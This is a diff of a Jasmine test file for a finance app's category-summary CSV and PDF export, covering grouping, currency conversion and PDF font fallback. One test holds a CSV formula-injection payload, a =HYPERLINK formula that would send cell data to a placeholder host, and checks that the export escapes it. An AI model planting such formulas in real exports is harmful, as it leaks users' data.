@@ -11,6 +11,7 @@ import { MockAuthService } from './testing/mock-auth.service';
 import { createTransaction, createCategory, createCategoryHierarchy } from './testing/test-data';
 import { parseCsvRows } from '../utils/csv.utils';
 import { Timestamp } from '@angular/fire/firestore';
+import type { Transaction } from '../../models';
 
 class MockTranslationService {
   currentLocale = signal('en');
@@ -36,12 +37,13 @@ describe('ExportService', () => {
   let service: ExportService;
   let categoryService: CategoryService;
   let currencyService: CurrencyService;
+  let fetchSpy: jasmine.Spy;
 
   beforeEach(() => {
     // The real CurrencyService starts a rates refresh in its constructor; on
     // CI runners the fetch can succeed and write cached rates through the
     // Firestore mock mid-test. Reject it so specs stay deterministic.
-    spyOn(window, 'fetch').and.rejectWith(new Error('network disabled in specs'));
+    fetchSpy = spyOn(window, 'fetch').and.rejectWith(new Error('network disabled in specs'));
 
     TestBed.configureTestingModule({
       providers: [
@@ -390,6 +392,204 @@ describe('ExportService', () => {
       expect(blob.size).toBeGreaterThan(0);
       const head = new TextDecoder().decode((await blob.arrayBuffer()).slice(0, 5));
       expect(head).toBe('%PDF-');
+    });
+  });
+
+  describe('category summary export', () => {
+    /**
+     * A rate that is deliberately not the compiled-in default.
+     *
+     * The suite's usual EUR 0.92 is byte-identical to CurrencyService's
+     * built-in fallback table, so a regression that silently converted
+     * against the defaults would look green. At 0.5 the two answers differ
+     * (200.00 against 108.70) and only the real seeded table produces the
+     * expected figure.
+     */
+    function seedDivergentRates(): void {
+      currencyService.exchangeRates.set(new Map([['USD', 1], ['EUR', 0.5]]));
+    }
+
+    /** A row written before the base-currency snapshot existed. */
+    function legacyRow(overrides: Partial<Transaction>): Transaction {
+      // The model types the snapshot as required, so a row without one can
+      // only be built by removing it after construction.
+      const row: Partial<Transaction> = createTransaction(overrides);
+      delete row.amountInBaseCurrency;
+      delete row.exchangeRate;
+      return row as Transaction;
+    }
+
+    async function summaryRows(
+      transactions: Transaction[],
+      baseCurrency = 'USD'
+    ): Promise<string[][]> {
+      const blob = service.exportCategorySummaryCSV(transactions, baseCurrency);
+      return parseCsvRows(await blob.text());
+    }
+
+    describe('exportCategorySummaryCSV', () => {
+      it('names every column in the header', async () => {
+        const rows = await summaryRows([createTransaction()]);
+
+        expect(rows[0]).toEqual(['Type', 'Category', 'Amount', 'Currency', 'Transactions']);
+      });
+
+      it('writes one row per category and type, income included', async () => {
+        const rows = await summaryRows([
+          createTransaction({ type: 'expense', amount: 30, categoryId: 'food_restaurants' }),
+          createTransaction({ type: 'expense', amount: 20, categoryId: 'food_restaurants' }),
+          createTransaction({ type: 'expense', amount: 80, categoryId: 'food_groceries' }),
+          createTransaction({ type: 'income', amount: 900, categoryId: 'employment_salary' }),
+        ]);
+
+        const type = rows[0].indexOf('Type');
+        const category = rows[0].indexOf('Category');
+        const amount = rows[0].indexOf('Amount');
+        const count = rows[0].indexOf('Transactions');
+
+        // Income has no grouping of its own anywhere else in the app, so its
+        // absence here would be invisible in every other suite.
+        expect(rows.length).toBe(4);
+        expect(rows.slice(1).map(r => [r[type], r[category], r[amount], r[count]])).toEqual([
+          ['expense', 'Groceries', '80.00', '1'],
+          ['expense', 'Restaurants', '50.00', '2'],
+          ['income', 'Salary', '900.00', '1'],
+        ]);
+      });
+
+      it('yields two rows for a category used on both sides', async () => {
+        const rows = await summaryRows([
+          createTransaction({ type: 'expense', amount: 40, categoryId: 'other' }),
+          createTransaction({ type: 'income', amount: 40, categoryId: 'other' }),
+        ]);
+
+        expect(rows.length).toBe(3);
+        expect(rows[1][rows[0].indexOf('Type')]).toBe('expense');
+        expect(rows[2][rows[0].indexOf('Type')]).toBe('income');
+      });
+
+      it('carries every category rather than the ten largest', async () => {
+        const transactions = Array.from({ length: 12 }, (_, i) => createTransaction({
+          type: 'expense',
+          amount: (i + 1) * 10,
+          categoryId: `cat_${i}`,
+        }));
+
+        const rows = await summaryRows(transactions);
+
+        // The report PDF slices its category table to ten; this export must
+        // not inherit that.
+        expect(rows.length).toBe(13);
+      });
+
+      it('writes amounts as bare decimals so a spreadsheet still sums them', async () => {
+        const rows = await summaryRows([
+          createTransaction({ amount: 45, amountInBaseCurrency: 45 }),
+        ]);
+
+        const cell = rows[1][rows[0].indexOf('Amount')];
+        expect(cell).toBe('45.00');
+        expect(Number(cell)).toBe(45);
+      });
+
+      it('labels every amount with the base currency it was converted into', async () => {
+        seedDivergentRates();
+
+        const rows = await summaryRows([createTransaction({
+          currency: 'EUR', amount: 100, amountInBaseCurrency: 150, exchangeRate: 1.5,
+        })]);
+
+        expect(rows[1][rows[0].indexOf('Currency')]).toBe('USD');
+      });
+
+      it('prefers the write-time snapshot over a live conversion', async () => {
+        seedDivergentRates();
+
+        const rows = await summaryRows([createTransaction({
+          currency: 'EUR', amount: 100, amountInBaseCurrency: 150, exchangeRate: 1.5,
+        })]);
+
+        // Neither the seeded live figure (200.00) nor the compiled-in default's
+        // (108.70): only the stored snapshot produces this.
+        expect(rows[1][rows[0].indexOf('Amount')]).toBe('150.00');
+      });
+
+      it('converts a legacy row without a snapshot at the loaded rate', async () => {
+        seedDivergentRates();
+
+        const rows = await summaryRows([legacyRow({ currency: 'EUR', amount: 100 })]);
+
+        expect(rows[1][rows[0].indexOf('Amount')]).toBe('200.00');
+      });
+
+      it('guards a category name a user typed as a formula', async () => {
+        categoryService.categories.set([createCategory({
+          id: 'sneaky',
+          name: '=HYPERLINK("http://x/?d="&A1,"receipt")',
+          type: 'expense',
+        })]);
+
+        const blob = service.exportCategorySummaryCSV(
+          [createTransaction({ categoryId: 'sneaky' })], 'USD');
+        const text = await blob.text();
+        const rows = parseCsvRows(text);
+
+        expect(text).toContain('\'=HYPERLINK');
+        // The comma in that name must not shift the two columns behind it.
+        expect(rows[1].length).toBe(rows[0].length);
+      });
+
+      it('names a category the account no longer has', async () => {
+        categoryService.categories.set([]);
+
+        const rows = await summaryRows([createTransaction({ categoryId: 'gone' })]);
+
+        expect(rows[1][rows[0].indexOf('Category')]).toBe('Unknown');
+      });
+
+      it('writes a header-only file for no transactions', async () => {
+        const rows = await summaryRows([]);
+
+        expect(rows.length).toBe(1);
+      });
+    });
+
+    describe('exportCategorySummaryPDF', () => {
+      it('renders a pdf on helvetica when the cjk font never arrives', async () => {
+        const blob = await service.exportCategorySummaryPDF([
+          createTransaction({ type: 'expense', amount: 30, categoryId: 'food_restaurants' }),
+          createTransaction({ type: 'income', amount: 900, categoryId: 'employment_salary' }),
+        ], 'USD', 'July 2026');
+
+        // The suite-wide fetch rejection stands in for an offline user: the
+        // font load must have been attempted and the report render anyway.
+        expect(fetchSpy).toHaveBeenCalledWith(jasmine.stringContaining('fonts.gstatic.com'));
+        const head = new TextDecoder().decode((await blob.arrayBuffer()).slice(0, 5));
+        expect(head).toBe('%PDF-');
+      });
+
+      it('renders a pdf for a period with no transactions', async () => {
+        const blob = await service.exportCategorySummaryPDF([], 'USD', 'July 2026');
+
+        // Neither table has a body and neither percentage has a denominator.
+        const head = new TextDecoder().decode((await blob.arrayBuffer()).slice(0, 5));
+        expect(head).toBe('%PDF-');
+      });
+
+      it('leaves the caller\'s array in the order it was given', async () => {
+        // exportToPDF sorts its category array in place; this builder is
+        // handed the reports tab's own list and must not touch it.
+        const transactions = [
+          createTransaction({ type: 'expense', amount: 10, categoryId: 'food_restaurants' }),
+          createTransaction({ type: 'expense', amount: 90, categoryId: 'food_groceries' }),
+          createTransaction({ type: 'income', amount: 500, categoryId: 'employment_salary' }),
+        ];
+        const order = transactions.map(t => t.id);
+
+        await service.exportCategorySummaryPDF(transactions, 'USD', 'July 2026');
+
+        expect(transactions.map(t => t.id)).toEqual(order);
+      });
     });
   });
 
